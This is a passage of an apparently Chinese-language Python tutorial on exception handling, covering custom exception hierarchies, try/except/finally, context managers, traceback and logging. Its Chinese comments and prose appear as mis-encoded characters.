<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ä¼˜åŠ¿ï¼šä¸åŒå±‚çœ‹åˆ°ä¸åŒæŠ½è±¡çº§åˆ«çš„å¼‚å¸¸ï¼</span>
<span class="hljs-comment"># æŒ‰å±‚æ¬¡å®šä¹‰å¼‚å¸¸</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">UserError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""ç”¨æˆ·å±‚å¼‚å¸¸ï¼ˆç›´æ¥å±•ç¤ºç»™ç”¨æˆ·ï¼‰"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">BusinessError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""ä¸šåŠ¡å±‚å¼‚å¸¸ï¼ˆè®°å½•æ—¥å¿—ï¼Œè½¬æ¢ä¸ºUserErrorï¼‰"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DataError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""æ•°æ®å±‚å¼‚å¸¸ï¼ˆè®°å½•è¯¦ç»†æ—¥å¿—ï¼‰"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-comment"># æ•°æ®å±‚</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">save_to_database</span>(<span class="hljs-params">data</span>):
    <span class="hljs-keyword">try</span>:
        db.insert(data)
    <span class="hljs-keyword">except</span> DatabaseError <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">raise</span> DataError(<span class="hljs-string">f"æ•°æ®åº“æ“ä½œå¤±è´¥: <span class="hljs-subst">{e}</span>"</span>) <span class="hljs-keyword">from</span> e      <span class="hljs-comment"># åŸå§‹å¼‚å¸¸ä¼šè¢«é™„åŠ ä¸ºæ–°å¼‚å¸¸çš„ __cause__</span>

<span class="hljs-comment"># ä¸šåŠ¡å±‚</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">process_user_order</span>(<span class="hljs-params">order</span>):
    <span class="hljs-keyword">try</span>:
        save_to_database(order)
        send_notification(order)
    <span class="hljs-keyword">except</span> DataError <span class="hljs-keyword">as</span> e:
        log_error(e)  <span class="hljs-comment"># è®°å½•æŠ€æœ¯ç»†èŠ‚</span>
        <span class="hljs-keyword">raise</span> UserError(<span class="hljs-string">"è®¢å•å¤„ç†å¤±è´¥ï¼Œè¯·è”ç³»å®¢æœ"</span>) <span class="hljs-keyword">from</span> e      <span class="hljs-comment"># è½¬æ¢ä¸ºç”¨æˆ·å‹å¥½çš„å¼‚å¸¸</span>

<span class="hljs-comment"># ç”¨æˆ·å±‚ï¼ˆå±•ç¤ºç»™ç”¨æˆ·ï¼‰</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_request</span>():
    <span class="hljs-keyword">try</span>:
        process_user_order(order_data)
    <span class="hljs-keyword">except</span> UserError <span class="hljs-keyword">as</span> e:
        show_error_message(<span class="hljs-built_in">str</span>(e))  <span class="hljs-comment"># æ˜¾ç¤ºå‹å¥½ä¿¡æ¯</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        log_error(e)
        show_error_message(<span class="hljs-string">"ç³»ç»Ÿé”™è¯¯ï¼Œè¯·ç¨åé‡è¯•"</span>)
</code></pre>
</li>
</ul>
<h3 data-id="heading-3">1.3 åœ¨å‡½æ•°ä¸­å£°æ˜å¼‚å¸¸ï¼Œ <strong>é€šè¿‡ raise</strong></h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">divide</span>(<span class="hljs-params">a: <span class="hljs-built_in">float</span>, b: <span class="hljs-built_in">float</span></span>) -&gt; <span class="hljs-built_in">float</span>:
    <span class="hljs-keyword">if</span> b == <span class="hljs-number">0</span>:
        <span class="hljs-keyword">raise</span> ZeroDivisionError(<span class="hljs-string">"é™¤æ•°ä¸èƒ½ä¸º 0"</span>)
    <span class="hljs-keyword">return</span> a / b
</code></pre>
<h3 data-id="heading-4">1.4 å¼‚å¸¸æ•è·ï¼ˆtry-exceptï¼‰</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ•è·å•ä¸ªå¼‚å¸¸</span>
<span class="hljs-keyword">try</span>:
    result = <span class="hljs-number">10</span> / <span class="hljs-number">0</span>
<span class="hljs-keyword">except</span> ZeroDivisionError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ•è·åˆ°å¼‚å¸¸: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ•è·å¤šä¸ªå¼‚å¸¸</span>
<span class="hljs-keyword">try</span>:
    value = <span class="hljs-built_in">int</span>(<span class="hljs-string">"abc"</span>)
<span class="hljs-keyword">except</span> (ValueError, TypeError) <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç±»å‹æˆ–å€¼é”™è¯¯: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># æ•è·æ‰€æœ‰ Exceptionç±» å¼‚å¸¸ï¼ˆâŒä¸€è‚¡è„‘/æœªæ‹†åˆ†ï¼Œä¸æ¨èï¼‰</span>
<span class="hljs-keyword">try</span>:
    risky_operation()
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å‘ç”Ÿå¼‚å¸¸: <span class="hljs-subst">{e}</span>"</span>)
</code></pre>
<h3 data-id="heading-5">1.5 å®Œæ•´çš„å¼‚å¸¸å¤„ç†ç»“æ„</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">try</span>:
    <span class="hljs-comment"># å¯èƒ½æŠ›å‡ºå¼‚å¸¸çš„ä»£ç </span>
    result = <span class="hljs-number">10</span> / <span class="hljs-number">0</span>
<span class="hljs-keyword">except</span> ZeroDivisionError <span class="hljs-keyword">as</span> e:
    <span class="hljs-comment"># æ•è·ç‰¹å®šå¼‚å¸¸</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é™¤é›¶é”™è¯¯: <span class="hljs-subst">{e}</span>"</span>)
<span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
    <span class="hljs-comment"># æ•è·å¦ä¸€ç§å¼‚å¸¸</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å€¼é”™è¯¯: <span class="hljs-subst">{e}</span>"</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-comment"># æ²¡æœ‰å¼‚å¸¸æ—¶æ‰§è¡Œ</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"è®¡ç®—æˆåŠŸ"</span>)
<span class="hljs-keyword">finally</span>:
    <span class="hljs-comment"># æ— è®ºæ˜¯å¦å¼‚å¸¸éƒ½æ‰§è¡Œ</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"æ¸…ç†èµ„æº"</span>)
</code></pre>
<ul>
<li>ä½¿ç”¨ with æ‰“å¼€æ–‡ä»¶æ—¶ï¼Œå³ä½¿å‘ç”Ÿå¼‚å¸¸ï¼Œæ–‡ä»¶ä¹Ÿä¼šæ­£ç¡®å…³é—­
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è‡ªåŠ¨ç®¡ç†èµ„æº</span>
<span class="hljs-comment"># å¤šä¸ªä¸Šä¸‹æ–‡ç®¡ç†å™¨</span>
<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">"input.txt"</span>, <span class="hljs-string">"r"</span>) <span class="hljs-keyword">as</span> fin, <span class="hljs-built_in">open</span>(<span class="hljs-string">"output.txt"</span>, <span class="hljs-string">"w"</span>) <span class="hljs-keyword">as</span> fout:
    data = fin.read()
    fout.write(processed_data)
</code></pre>
</li>
<li>è‡ªå®šä¹‰ä¸Šä¸‹æ–‡ç®¡ç†å™¨
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> contextlib <span class="hljs-keyword">import</span> contextmanager

<span class="hljs-meta">@contextmanager</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">database_transaction</span>():
    <span class="hljs-string">"""æ•°æ®åº“äº‹åŠ¡ä¸Šä¸‹æ–‡ç®¡ç†å™¨"""</span>
    conn = connect_database()
    <span class="hljs-keyword">try</span>:
        <span class="hljs-keyword">yield</span> conn
        conn.commit()
    <span class="hljs-keyword">except</span> Exception:
        conn.rollback()
        <span class="hljs-keyword">raise</span>
    <span class="hljs-keyword">finally</span>:
        conn.close()

<span class="hljs-comment"># ä½¿ç”¨</span>
<span class="hljs-keyword">with</span> database_transaction() <span class="hljs-keyword">as</span> conn:
    conn.execute(<span class="hljs-string">"INSERT INTO users VALUES (?, ?)"</span>, (<span class="hljs-string">"Alice"</span>, <span class="hljs-number">25</span>))
</code></pre>
</li>
</ul>
<h3 data-id="heading-6">1.6 å¼‚å¸¸ä¿¡æ¯è®¿é—®</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"è‡ªå®šä¹‰é”™è¯¯æ¶ˆæ¯"</span>)
<span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ¶ˆæ¯: <span class="hljs-subst">{e}</span>"</span>)             <span class="hljs-comment"># å¼‚å¸¸æ¶ˆæ¯</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"ç±»å‹: <span class="hljs-subst">{<span class="hljs-built_in">type</span>(e).__name__}</span>"</span>)      <span class="hljs-comment"># å¼‚å¸¸ç±»å‹</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å‚æ•°: <span class="hljs-subst">{e.args}</span>"</span>)        <span class="hljs-comment"># å¼‚å¸¸å‚æ•°</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å­—ç¬¦ä¸²: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>)      <span class="hljs-comment"># å¼‚å¸¸çš„å­—ç¬¦ä¸²è¡¨ç¤º   </span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"Repr: <span class="hljs-subst">{<span class="hljs-built_in">repr</span>(e)}</span>"</span>)       <span class="hljs-comment"># å¼‚å¸¸çš„ repr</span>
</code></pre>
<h3 data-id="heading-7">1.7 å¼‚å¸¸ä¼ æ’­æœºåˆ¶ï¼šå¼‚å¸¸æ²¿ç€è°ƒç”¨æ ˆå‘ä¸Šä¼ æ’­</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">function_c</span>():
    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"åº•å±‚é”™è¯¯"</span>)

<span class="hljs-keyword">def</span> <span class="hljs-title function_">function_b</span>():
    function_c()  <span class="hljs-comment"># å¼‚å¸¸ä»è¿™é‡Œå¼€å§‹ä¼ æ’­</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">function_a</span>():
    <span class="hljs-keyword">try</span>:
        function_b()
    <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"åœ¨ function_a ä¸­æ•è·: <span class="hljs-subst">{e}</span>"</span>)

function_a()  <span class="hljs-comment"># è¾“å‡º: åœ¨ function_a ä¸­æ•è·: åº•å±‚é”™è¯¯</span>
<span class="hljs-comment"># function æ˜¯ æ ‡å‡† æ‹¼å†™ ï¼ï¼</span>
</code></pre>
<h2 data-id="heading-8">2ã€è°ƒè¯•å¼‚å¸¸</h2>
<h3 data-id="heading-9">2.1 å¼‚å¸¸å›æº¯æŸ¥çœ‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> traceback

<span class="hljs-keyword">try</span>:
    <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">"æµ‹è¯•å¼‚å¸¸"</span>)
<span class="hljs-keyword">except</span> Exception:
    traceback.print_exc()        <span class="hljs-comment"># æ‰“å°å®Œæ•´çš„å¼‚å¸¸å›æº¯</span>
    
    tb_info = traceback.format_exc()        <span class="hljs-comment"># è·å–å›æº¯ä¿¡æ¯</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"å¼‚å¸¸ä¿¡æ¯:\n<span class="hljs-subst">{tb_info}</span>"</span>)
</code></pre>
<h3 data-id="heading-10">2.2 ä½¿ç”¨ logging è®°å½•å¼‚å¸¸</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> logging

logger = logging.getLogger(__name__)

<span class="hljs-keyword">try</span>:
    risky_operation()
<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
    logger.error(<span class="hljs-string">"æ“ä½œå¤±è´¥"</span>, exc_info=<span class="hljs-literal">True</span>)         <span class="hljs-comment"># è®°å½•å¼‚å¸¸ï¼ŒåŒ…å«å †æ ˆä¿¡æ¯</span>
    logger.exception(<span class="hljs-string">"æ“ä½œå¤±è´¥"</span>)            <span class="hljs-comment"># æˆ–ç®€å†™å½¢å¼</span>
</code></pre>
<h2 data-id="heading-11">3ã€é¡¹ç›®ä¸­çš„åº”ç”¨æ€»ç»“</h2>
<h3 data-id="heading-12">3.1 ä»¥ä¸‹è®¾è®¡ä½¿å¾—ä»£ç å¥å£®ã€å¯ç»´æŠ¤ï¼Œå¹¶ä¸”æ˜“äºè°ƒè¯•ã€‚</h3>
<ul>
<li>å®šä¹‰æ¸…æ™°çš„å¼‚å¸¸å±‚æ¬¡ï¼šå¦‚ AgentError ä½œä¸ºåŸºç±»ï¼Œæ´¾ç”Ÿå‡ºå…·ä½“å¼‚å¸¸</li>
<li>åœ¨æ–‡æ¡£ä¸­å£°æ˜å¼‚å¸¸ï¼šä½¿ç”¨ Raises: éƒ¨åˆ†</li>
<li>å¼‚å¸¸ä¼ æ’­ï¼šåº•å±‚æŠ›å‡ºï¼Œä¸Šå±‚æ•è·å¤„ç†</li>
<li>é”™è¯¯æ—¥å¿—ï¼šä½¿ç”¨ logger.error() è®°å½•å¼‚å¸¸</li>
<li>èµ„æºæ¸…ç†ï¼šåœ¨å¼‚å¸¸å‘ç”Ÿæ—¶æ¸…ç†èµ„æºï¼ˆå¦‚ self.messages.pop()ï¼‰</li>
</ul>
<h3 data-id="heading-13">3.2 å¥½çš„ç¤ºä¾‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âœ… æ•è·ç‰¹å®šçš„å¼‚å¸¸</span>
<span class="hljs-keyword">try</span>:
    data = parse_json(json_string)
<span class="hljs-keyword">except</span> json.JSONDecodeError <span class="hljs-keyword">as</span> e:
    logger.error(<span class="hljs-string">f"JSON è§£æå¤±è´¥: <span class="hljs-subst">{e}</span>"</span>)
    handle_error()
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âœ… æä¾›æœ‰æ„ä¹‰çš„é”™è¯¯æ¶ˆæ¯</span>
<span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">f"å¹´é¾„ <span class="hljs-subst">{age}</span> æ— æ•ˆï¼Œå¿…é¡»åœ¨ 0 åˆ° 150 ä¹‹é—´"</span>)
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âœ… ä½¿ç”¨å¼‚å¸¸é“¾ä¿ç•™ä¸Šä¸‹æ–‡</span>
<span class="hljs-keyword">try</span>:
    load_config()
<span class="hljs-keyword">except</span> IOError <span class="hljs-keyword">as</span> e:
    <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">"æ— æ³•åŠ è½½é…ç½®"</span>) <span class="hljs-keyword">from</span> e
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âœ… åœ¨æ–‡æ¡£ä¸­å£°æ˜å¯èƒ½æŠ›å‡ºçš„å¼‚å¸¸</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">connect_database</span>(<span class="hljs-params">url: <span class="hljs-built_in">str</span></span>) -&gt; Connection:
    <span class="hljs-string">"""
    è¿æ¥åˆ°æ•°æ®åº“
    
    Raises:
        ConnectionError: è¿æ¥å¤±è´¥æ—¶æŠ›å‡º
        TimeoutError: è¿æ¥è¶…æ—¶æ—¶æŠ›å‡º
    """</span>
    <span class="hljs-keyword">pass</span>
</code></pre>
<h3 data-id="heading-14">3.3 ä¸æ°å½“ç¤ºä¾‹</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ æ•è·æ‰€æœ‰å¼‚å¸¸ä½†ä¸å¤„ç†</span>
<span class="hljs-keyword">try</span>:
    do_something()
<span class="hljs-keyword">except</span>:
    <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># åæ‰æ‰€æœ‰å¼‚å¸¸</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ ä½¿ç”¨è£¸ except</span>
<span class="hljs-keyword">try</span>:
    do_something()
<span class="hljs-keyword">except</span>:  <span class="hljs-comment"># åº”è¯¥æŒ‡å®šå¼‚å¸¸ç±»å‹</span>
    <span class="hljs-keyword">pass</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ è¿‡äºå®½æ³›çš„å¼‚å¸¸æ•è·</span>
<span class="hljs-keyword">try</span>:
    process_data()
<span class="hljs-keyword">except</span> Exception:  <span class="hljs-comment"># åº”è¯¥æ•è·æ›´å…·ä½“çš„å¼‚å¸¸</span>
    <span class="hljs-keyword">pass</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># âŒ å¿½ç•¥å¼‚å¸¸ä¿¡æ¯</span>
<span class="hljs-keyword">try</span>:
    risky_operation()
<span class="hljs-keyword">except</span> ValueError:
    <span class="hljs-keyword">pass</span>  <span class="hljs-comment"># æ²¡æœ‰è®°å½•æˆ–å¤„ç†å¼‚å¸¸ä¿¡æ¯</span>
</code></pre>
<h2 data-id="heading-15">4ã€å¼‚å¸¸æŠ›å‡ºçš„è‡ªå®šä¹‰</h2>
<ul>
<li>Pythonæ”¯æŒè‡ªå®šä¹‰å¼‚å¸¸æŠ›å‡ºï¼Œç»§æ‰¿Exceptionå³å¯ï¼Œå¾ˆç®€å•ã€‚</li>
</ul>
<h3 data-id="heading-16">4.1 ä»€ä¹ˆåœºæ™¯éœ€è¦è‡ªå®šä¹‰</h3>
<ul>
<li>æ˜¯å¦éœ€è¦è‡ªå®šä¹‰ï¼Œä¸»è¦çœ‹åœºæ™¯ï¼š
<ul>
<li>å°è„šæœ¬/ä¸´æ—¶ä»£ç  â†’ ç”¨å†…ç½®å¼‚å¸¸è¶³å¤Ÿ</li>
<li>ä¸šåŠ¡åº”ç”¨/æ¡†æ¶/åº“ â†’ å¿…é¡»å®šä¹‰è‡ªå®šä¹‰å¼‚å¸¸</li>
<li>ä¸­å¤§å‹é¡¹ç›® â†’ å»ºç«‹å®Œæ•´çš„å¼‚å¸¸å±‚æ¬¡ä½“ç³»</li>
</ul>
</li>
<li>åº”è¯¥è‡ªå®šä¹‰çš„åœºæ™¯ä¸¾ä¾‹</li>
</ul>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-code">        åœºæ™¯                 ç¤ºä¾‹                   åŸå›     
 1. ä¸šåŠ¡é¢†åŸŸé”™è¯¯       è®¢å•ä¸å­˜åœ¨ã€åº“å­˜ä¸è¶³      æ›´æ¸…æ™°è¡¨è¾¾ä¸šåŠ¡é€»è¾‘
 2. éœ€è¦æºå¸¦é¢å¤–ä¿¡æ¯	 é”™è¯¯ä»£ç ã€ä¸Šä¸‹æ–‡æ•°æ®	  å†…ç½®å¼‚å¸¸æ— æ³•æ‰¿è½½
 3. åˆ†å±‚å¼‚å¸¸å¤„ç†	     æ§åˆ¶å±‚ã€æœåŠ¡å±‚ã€æ•°æ®å±‚	  ä¸åŒå±‚å¤„ç†ä¸åŒå¼‚å¸¸
 4. æ¡†æ¶/åº“å¼€å‘	     Webæ¡†æ¶ã€ORM	         ç”¨æˆ·éœ€è¦åŒºåˆ†ä½ çš„å¼‚å¸¸
 5. éœ€è¦ç‰¹å®šæ¢å¤é€»è¾‘	 é‡è¯•ã€é™çº§	              ä¸åŒå¼‚å¸¸ä¸åŒå¤„ç†æ–¹å¼
</span></code></pre>
<h3 data-id="heading-17">4.2 è‡ªå®šä¹‰å¼‚å¸¸ç»§æ‰¿å±‚æ¬¡è®¾è®¡ç¤ºæ„</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># é¡¹ç›®ä¸­çš„å¼‚å¸¸ç»§æ‰¿å±‚æ¬¡ï¼ˆå‚è€ƒé¡¹ç›®ä»£ç ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">AgentError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""Agent åŸºç¡€å¼‚å¸¸ç±»ï¼Œ åç»­å¼‚å¸¸ç±»å‡ç»§æ‰¿äºæ­¤ï¼Œä¾¿äºç®¡ç†"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ToolExecutionError</span>(<span class="hljs-title class_ inherited__">AgentError</span>):
    <span class="hljs-string">"""å·¥å…·æ‰§è¡Œå¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">ToolValidationError</span>(<span class="hljs-title class_ inherited__">AgentError</span>):
    <span class="hljs-string">"""å·¥å…·å‚æ•°éªŒè¯å¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-title class_ inherited__">AgentError</span>):
    <span class="hljs-string">"""API è°ƒç”¨å¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">MaxIterationsExceededError</span>(<span class="hljs-title class_ inherited__">AgentError</span>):
    <span class="hljs-string">"""è¶…è¿‡æœ€å¤§è¿­ä»£æ¬¡æ•°å¼‚å¸¸"""</span>
    <span class="hljs-keyword">pass</span>
</code></pre>
<h3 data-id="heading-18">4.3 å¼‚å¸¸æŠ›å‡º è‡ªå®šä¹‰çš„ä¸‰ç§å±‚æ¬¡</h3>
<ul>
<li>ç®€å•ç»§æ‰¿ï¼ˆç©ºå¼‚å¸¸ç±»ï¼‰
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""è‡ªå®šä¹‰å¼‚å¸¸åŸºç±»"""</span>        <span class="hljs-comment"># ç»§æ‰¿è‡ªException</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleError</span>(<span class="hljs-title class_ inherited__">MyError</span>):
    <span class="hljs-keyword">pass</span>
</code></pre>
</li>
<li>å¸¦æ„é€ å‡½æ•°çš„å¼‚å¸¸
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""è‡ªå®šä¹‰å¼‚å¸¸åŸºç±»"""</span>        <span class="hljs-comment"># ç»§æ‰¿è‡ªException</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">DetailedError</span>(<span class="hljs-title class_ inherited__">MyError</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, message: <span class="hljs-built_in">str</span>, code: <span class="hljs-built_in">int</span></span>):
        self.message = message
        self.code = code
        <span class="hljs-built_in">super</span>().__init__(<span class="hljs-string">f"é”™è¯¯ <span class="hljs-subst">{code}</span>: <span class="hljs-subst">{message}</span>"</span>)
</code></pre>
</li>
<li>å®Œæ•´çš„å¼‚å¸¸ç±»ï¼ˆå¸¦å¤šä¸ªæ–¹æ³•ï¼‰
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""è‡ªå®šä¹‰å¼‚å¸¸åŸºç±»"""</span>        <span class="hljs-comment"># ç»§æ‰¿è‡ªException</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">FullFeaturedError</span>(<span class="hljs-title class_ inherited__">MyError</span>):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, message: <span class="hljs-built_in">str</span>, details: <span class="hljs-built_in">dict</span></span>):
        self.message = message
        self.details = details
        <span class="hljs-built_in">super</span>().__init__(message)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"[<span class="hljs-subst">{self.message}</span>] è¯¦æƒ…: <span class="hljs-subst">{self.details}</span>"</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_details</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> self.details
</code></pre>
</li>
</ul>
<h3 data-id="heading-19">4.4 è‡ªå®šä¹‰ä¸ä½¿ç”¨</h3>
<ul>
<li>
<p>å¦‚éœ€æŠ›å‡ºå¼‚å¸¸æ—¶è‡ªåŠ¨å¤„ç†æŸäº›å‚æ•°ï¼Œæˆ–è€…ç»™å¼‚å¸¸ç»‘å®šç‰¹å®šçš„å˜é‡ï¼Œåˆ™éœ€è¦æ›¿æ¢ pass ä¸ºå…·ä½“ä»£ç ï¼ˆé€šå¸¸æ˜¯ <strong>init</strong> æ–¹æ³•ï¼‰ã€‚ä»£ç ç¤ºä¾‹å¦‚ä¸‹</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""è¿™é‡Œéœ€è¦æ›¿æ¢ passï¼Œå¡«å†™å…·ä½“é€»è¾‘"""</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, message, error_code, tm</span>):
        <span class="hljs-built_in">super</span>().__init__(message)       <span class="hljs-comment"># åˆå§‹åŒ–çˆ¶ç±»</span>
        self.error_code = error_code    <span class="hljs-comment"># æ·»åŠ è‡ªå®šä¹‰å±æ€§</span>
        self.tm = tm

<span class="hljs-comment"># å°è£… raise é€»è¾‘</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">fail_fast</span>(<span class="hljs-params">message, error_code, tm</span>):
    <span class="hljs-comment"># raise ä¾ç„¶å­˜åœ¨äºè¿™é‡Œï¼Œåªæ˜¯è¢«è—èµ·æ¥äº†</span>
    <span class="hljs-keyword">raise</span> MyError(message, error_code, tm)

<span class="hljs-comment"># å¼‚å¸¸æŠ›å‡ºçš„ä½¿ç”¨</span>
<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime
<span class="hljs-keyword">try</span>:
    <span class="hljs-string">'''
    å¸¸è§„å‡½æ•°ä½“ï¼ŒåŠåˆ¤å®šé€»è¾‘
    å¯ä»¥ç»“åˆ if ç­‰åˆ¤å®šé€»è¾‘è¿›è¡Œ
    '''</span>
    current_datetime = datetime.now()   <span class="hljs-comment"># è·å–å½“å‰çš„æ—¥æœŸå’Œæ—¶é—´</span>
    formatted_datetime = current_datetime.strftime(<span class="hljs-string">"%Y-%m-%d %H:%M:%S.%f"</span>)[:]   <span class="hljs-comment"># å°†datetimeå¯¹è±¡è½¬æ¢ä¸ºè‡ªå®šä¹‰çš„å­—ç¬¦ä¸²æ ¼å¼</span>
    
    <span class="hljs-keyword">raise</span> MyError(<span class="hljs-string">"ç³»ç»Ÿå´©æºƒäº†"</span>, <span class="hljs-number">500</span>, formatted_datetime)
    <span class="hljs-comment"># æˆ–è€… fail_fast("ç³»ç»Ÿå´©æºƒäº†", 500, formatted_datetime) </span>
<span class="hljs-keyword">except</span> MyError <span class="hljs-keyword">as</span> e:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"é”™è¯¯ä¿¡æ¯: <span class="hljs-subst">{e}</span>, é”™è¯¯ä»£ç : <span class="hljs-subst">{e.error_code}</span>, é”™è¯¯æ—¶é—´ï¼š<span class="hljs-subst">{e.tm}</span>"</span>)
</code></pre>
</li>
<li>
<p>ç±»çš„ <code>__str__(self)</code> é­”æœ¯æ–¹æ³•çš„ä½¿ç”¨</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å®šä¹‰è‡ªå®šä¹‰å¼‚å¸¸ç±»</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MyError</span>(<span class="hljs-title class_ inherited__">Exception</span>):
    <span class="hljs-string">"""è‡ªå®šä¹‰å¼‚å¸¸åŸºç±»"""</span>
    <span class="hljs-keyword">pass</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">APIError</span>(<span class="hljs-title class_ inherited__">MyError</span>):
    <span class="hljs-string">"""API è°ƒç”¨å¼‚å¸¸"""</span>
    <span class="hljs-comment"># æ„é€ æ–¹æ³•ï¼Œåˆ›å»ºå¯¹è±¡æ—¶è‡ªåŠ¨è°ƒç”¨ï¼Œåˆå§‹åŒ–å¯¹è±¡å±æ€§</span>
